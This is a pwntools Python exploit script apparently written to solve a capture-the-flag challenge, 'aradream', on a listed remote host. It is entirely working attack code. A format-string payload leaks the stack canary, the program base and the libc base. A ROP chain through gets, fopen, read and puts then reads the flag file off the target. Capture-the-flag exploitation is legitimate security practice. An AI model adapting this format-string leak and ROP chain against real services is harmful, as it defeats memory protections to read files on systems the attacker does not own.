#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 128.199.158.188 --port 1024 ./aradream
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./aradream')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '128.199.158.188'
port = int(args.PORT or 1024)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript,aslr=0, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x555555555557
b *0x5555555555cb
b *0x55555555560a
b *0x55555555546d
b *0x555555555439
b *0x0000555555555673
continue
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF("libc.so.6")

pop_rdi=0x0000000000001673
pop_rsi=0x0000000000001671
pop_rbp=0x0000000000001253
base_exe=0x165d

p = "%700x%7$n-%17$p-%11$p-%19$p"
io.sendlineafter("Nickname :",p)

io.recvuntil("Hallo :")
io.recvline()
leak = io.recvline().split("-")[1:]
print (leak)
leak[2] = leak[2][:-1]
canary= int(leak[0],16)
base_exe = int(leak[1],16) - base_exe

if args.LOCAL:
    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234
else:
    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 - 9

fopen = libc.sym["fopen"]
gets = libc.sym["gets"]
read = libc.sym["read"]
puts = libc.sym["puts"]

perm = base_exe + 0x2019
pop_rdi = base_exe + pop_rdi
pop_rsi = base_exe + pop_rsi


# ROPgadget --binary libc.so.6 |grep "pop rdx"
if args.LOCAL:
    pop_rdx = libc.address + 0x00000000001376e2
else:
    pop_rdx = libc.address + 0x000000000011c371

bss = base_exe + 0x4250

print "canary :", hex(canary)
print "base exe :", hex(base_exe)
print "base libc :", hex(libc.address)

p = 'a'*72
p += p64(canary)
p += p64(0)

p += p64(pop_rdi)
p += p64(bss)
p += p64(gets)

p += p64(pop_rdi )
p += p64(bss)
p += p64(pop_rsi )
p += p64(perm)
p += p64(0)
p += p64(fopen)

p += p64(pop_rdi )
p += p64(3)
p += p64(pop_rsi )
p += p64(bss+0x100)
p += p64(3)
p += p64(pop_rdx)
p += p64(100)
p += p64(0)
p += p64(read)

p += p64(pop_rdi)
p += p64(bss+0x100)
p += p64(puts)

io.sendlineafter("Dream :",p)

sleep(0.5)
if args.LOCAL:
    p = "flag.txt\x00"
else:
    p = "/home/ctf/araflag.txt\x00"
io.sendline(p)

io.interactive()
